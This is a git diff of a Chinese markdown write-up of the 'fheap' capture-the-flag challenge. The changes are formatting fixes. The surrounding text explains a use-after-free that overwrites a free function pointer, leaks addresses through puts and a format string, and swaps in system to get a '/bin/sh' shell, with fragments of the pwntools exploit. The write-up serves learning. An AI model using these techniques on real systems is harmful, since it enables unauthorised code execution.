@@ -20,12 +20,15 @@ strip fheap
         <li> delete string
         <li> quit
 </ol>
+
 > 1. 选择`create string`, 输入size, content.
 > 2. 选择`delete string`, 输入id, 是否删除.
 > 3. 选择`quit`, 退出程序.
 
 **结论:** 这是程序运行的简单介绍, 实际上就是一个字符串的管理程序。创建就是`malloc`, 删除`free`.
+
 **3. 程序分析**
+
 结构体:
 ```
 typedef struct String{
@@ -42,14 +45,14 @@ struct {
     String *str;
 } Strings[0x10];
 ```
-> ** 1. `create string ` **
+> **1. `create string ` **
 >> 1. 字符串块<16, 在原来的堆块上存放输入的字符串。
 ![](./01.png) 
 >> 2. 字符串块>=16, `malloc`一个输入的字符串大小size的空间， 将该空间地址存放在原来的堆块中。
 ![](./02.png) 
 
 - - - 
-> ** 2. `delete string`**
+> **2. `delete string`**
 ```
 关键代码:
     if (Strings[id].str) {
@@ -70,7 +73,7 @@ delete(1)
 delete(0)
 create(0x18, 'a' * 0x18) --> id = 0;
 ```
-**注意: **最后一次`create(0x18, 'a' * 0x18 )`, `malloc`两个堆块, 分别为`0x5010, 0x5040`, 其中`0x5040`存放的是字符串内容. `0x5010`存放着`0x5040`地址, 如下: .
+**注意:** 最后一次`create(0x18, 'a' * 0x18 )`, `malloc`两个堆块, 分别为`0x5010, 0x5040`, 其中`0x5040`存放的是字符串内容. `0x5010`存放着`0x5040`地址, 如下: .
 ```
 0x5000:		0x0000000000000000		0x0000000000000031
 0x5010:		0x0000000000005040		0x0000000000000000
@@ -97,11 +100,15 @@ gdb.attach(p)
 ......
 ```
 > 执行过程中会弹出一个`gdb`的调试窗口, 这个窗口只和你写的`Python`脚本进行交互, 我们在`Python`脚本中写入发送的数据即可.
+
 ### 三. 思路总结
+
 **保护检查**
+
 ![](./03.png)
+
 **总体思路:** 泄露程序基地址, 找出system函数地址. 将free地址覆盖为`system`, 输入`/bin/sh`, 释放.
-** First Step : 泄露程序基地址**
+**First Step : 泄露程序基地址**
 > `objdump -d fheap > fheap.txt`
 ```
 freeShort(offset): 0xd52
@@ -111,6 +118,7 @@ d2d:	e8 5e fc ff ff       	callq  990 <puts@plt>
 可以看出, 两个free函数与0xd2d只相差一个字节, 于是我们可以将free函数的最后一个字节修改为0x2d, 从而调用`puts`函数, 将字符串和`callq  990`这条指令的地址一块打印出来, 然后减去0xd2d, 就是整个程序加载的基地址.
 
 ---------
+
 **泄露system函数地址 **
 > 利用格式化字符串漏洞, 以及`pwntools`模块的`DynELF`来找出`system`函数地址.
 ```
@@ -129,12 +137,12 @@ def leak(addr):
 	data += "\x00"
 	return data
 ```
-** 最后一步**
+**最后一步**
 > 发送"/bin/sh", 用system函数覆盖free函数.
 ```
 payload = '/bin/sh\x00' + '#' * (0x18 - len('/bin/sh\x00')) + p64(system_addr)
 ```
-###EXP
+### EXP
 ```
 from pwn import *
 from ctypes import *
@@ -230,14 +238,14 @@ def pwn():
 if __name__ == '__main__':
     pwn()
 ```
-###心得
+### 心得
 > 这是我第一次接触堆方面的题, 说实话这个过程实在很苦. 
 >> 1. 网上找的相关文章, 水平参差不齐, EXP基本不能成功的GetShell. 
 >> 2. 调试方面的锅, 不能直接调试.
 >> 3. 堆方面的知识太少, 还得练.
 
-** 最后, 与君共勉, 加油!!! **
-###相关链接:
+**最后, 与君共勉, 加油!!!**
+### 相关链接:
 1. [逆向安全系列：Use After Free漏洞浅析](https://www.anquanke.com/post/id/85281) (EXP有效)
 2. [fast-bin内存机制的利用探究](https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/) (调试新方法, 针对地址随机化)
 3. [hctf2016 fheap学习(FreeBuf发表的官方解法)](http://www.cnblogs.com/shangye/p/6156391.html) (知识点较全)
